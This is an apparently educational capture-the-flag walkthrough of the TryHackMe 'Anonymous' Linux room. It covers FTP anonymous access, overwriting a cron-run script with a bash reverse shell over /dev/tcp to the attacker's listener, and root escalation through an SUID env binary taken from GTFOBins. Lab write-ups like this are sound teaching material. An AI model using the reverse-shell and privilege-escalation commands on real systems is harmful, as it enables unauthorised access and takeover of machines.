---
layout: post
title: "Anonymous"
date: 2022-04-24
categories: [Tryhackme, Medium-THM]
tags: [security, linux, permissions, medium]
image: ../../assets/img/posts/Anonymous.png 

---

## Description

Penetration Testing Challenge.

|**Room**|[Internal](https://tryhackme.com/room/anonymous)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Medium|
|**Creator**|[Nameless0ne](https://tryhackme.com/p/Nameless0ne)|

---

After deploying the machine, we'll get started with nmap scan,

```bash
sudo nmap -A -T4 -p- 10.10.180.242 -oN nmap_scan
```

![image](https://user-images.githubusercontent.com/67465230/164978442-e34ed3d4-d71a-42d6-96ee-bdb0c8f10250.png)

We found that open ports are 21 (FTP), 22 (SSH), 139,445 (SMB). With nmap scan result we know that we can login via FTP as anonymous user. So let's enumerate.

Connecting to ftp service via anonymous user,

```bash
ftp 10.10.180.242
```

We got successfully connected to machine via ftp. Now enumerating it,

![image](https://user-images.githubusercontent.com/67465230/164978450-50014b5d-f001-4c2c-9d95-5812ebc1be55.png)

we found directory called **scripts** and navigating to scripts,

![image](https://user-images.githubusercontent.com/67465230/164978680-f9336146-2196-4aa7-a2f4-da0d232d27da.png)

there we found 3 files, so we'll now download them to our local system.

using **get** command to download these files on our system.

![image](https://user-images.githubusercontent.com/67465230/164978453-8b31288d-38f5-4953-a868-948caeec3fb3.png)

Now that we've these 3 files on our local system, let's look inside what is their in these files,

```bash
cat to_do.txt
```

![image](https://user-images.githubusercontent.com/67465230/164978454-eaec24d5-a6c5-4484-9205-d931d424b800.png)

It's a normal text. Doesn't gonna help us much.

seeing the content of next file,

```bash
cat clean.sh
```

![image](https://user-images.githubusercontent.com/67465230/164978458-3a4c7de9-1bcd-4e4d-b5e1-5cd5e14609f9.png)

after looking at this, this reminds me **CronJobs**. Let's break down this script,
- the variable “tmp_files” is set as 0.
- In if check, the script checks whether value of tmp_files is equal to 0. If so, it echoes a message like: “Running cleanup script: nothing to delete” into “removed_files.log” file. Now that’s interesting. Because; if we look on the removed_files.log file, maybe we can get some valuable information.
- Lastly, in else condition, if the value of tmp_files is other than 0, it removes the file and prints another message.

Now, let's inspect removed_files.log file

```bash
cat removed_files.log
```

![image](https://user-images.githubusercontent.com/67465230/164978463-225b14c4-0378-434a-9204-7c2949e1c8f6.png)

We'll that's wasnt helpful at all. From further enumeration, we got that the **clean.sh** file is writable. So, if we put reverse shell (bash) on FTP, it'll get executed by cronjobs and we'll get the shell.

So let's edit the script, we'll put one liner bash reverse shell in this script including our listening IP and desired port,

```bash
bash -c 'exec bash -i &>/dev/tcp/10.9.189.151/4444 <&1'
```

![image](https://user-images.githubusercontent.com/67465230/164978464-6626fd67-d781-415e-9c8b-7251407bb969.png)

Now, we'll put this script into machine via FTP using **put** command.

```bash
put clean.sh clean.sh
```

![image](https://user-images.githubusercontent.com/67465230/164978467-a8ad4caa-9239-4ef0-9ddd-685f278747fc.png)

the first clean.sh represents the file which I've created in our local system and second file clean.sh represents the file already present on the ftp server. When this command gets executed, the file which we've created will modify the file which is already present. Now, we'll setup netcat listener on port 4444, and after waiting sometime, we'll get connection to machine on netcat.

![image](https://user-images.githubusercontent.com/67465230/164978469-af2c1b9b-8a55-454f-8ab8-5bde3e953919.png)

we are **namelessone** user. Let's look for user flag. 

Doing **ls** to establish all the files present in directory and we got our user flag,

![image](https://user-images.githubusercontent.com/67465230/164978471-7d46f3d7-cc56-440d-90be-a7c6c8534e5d.png)

Now, it's time for privilege escalation. We'll start it with searching for binaries which we can run with **sudo** command to elevate privilege.

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/164978474-5fd28d1a-563e-44ae-bcee-b48173b3098f.png)

Since we can't find any binaries so now we'll find those binaries which has SUID bit set on them so we can abuse them to get system shell.

```bash
find / -type f -perm -04000 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/164978479-da4a883f-16b9-4ee4-99c4-8b5469960555.png)

We can see that there's a binary which has SUID bit set on it. So I tried to check this **env** on infamous helper GTFOBins https://gtfobins.github.io, and I found something which will help us to get system shell by abusing SUID.

![image](https://user-images.githubusercontent.com/67465230/164978482-1c6ddfd3-5df1-4e93-b148-f9e35bada294.png)

So when we run this command, this will get us system shell. Now, we'll do it as it says.

```bash
/usr/bin/env /bin/sh -p
```

![image](https://user-images.githubusercontent.com/67465230/164978485-5796e7c8-5bae-424c-bfa9-5c9c72c17441.png)

and we got system shell. Now, we can look for root flag.